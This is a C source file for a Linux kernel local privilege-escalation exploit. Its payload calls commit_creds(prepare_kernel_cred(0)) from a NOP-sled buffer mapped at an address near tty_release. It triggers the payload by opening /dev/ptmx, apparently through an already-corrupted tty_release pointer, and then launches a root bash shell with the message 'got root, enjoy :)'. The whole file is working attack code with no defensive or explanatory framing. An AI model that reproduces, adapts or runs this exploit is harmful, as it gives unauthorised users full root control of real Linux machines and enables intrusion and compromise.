#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <errno.h>
#include "version.h"

#define PAYLOADSIZE 			0x2000

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

int __attribute__((regparm(3)))
kernel_payload(void* foo, void* bar)
{
    _commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
    _prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;
	
    *((int*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 4)) = -1;    // restore pointer
    commit_creds(prepare_kernel_cred(0));
	
    return -1;
}

void prepare_evil_payload()
{
	void	*code;
	
	/* Prepare payload... */
    printf("preparing payload . . .\n");
    code = mmap((void*)(TTY_RELEASE & 0x000000fffffff000LL), PAYLOADSIZE, PROT_EXEC | PROT_READ | PROT_WRITE, 0x32, 0x0, 0x0);
	
	if(code == (void *)-1){
		printf("mmap error:%s\n", strerror(errno));
		return;
	}
	
	memset(code, 0x90, PAYLOADSIZE);
    code += PAYLOADSIZE - 1024;
    memcpy(code, &kernel_payload, 1024);
}

int main(int argc, char **argv)
{
	int		fd;
	
	prepare_evil_payload();
	
	/* trigger */
	printf("trigger modified tty_release . . .\n");
	fd = open("/dev/ptmx", 'r');
	close(fd);
	
	if (getuid() != 0) {
		printf("failed to get root :(\n");
		exit(EXIT_FAILURE);
	}
	
	printf("got root, enjoy :)\n");
	return execl("/bin/bash", "-sh", NULL);
}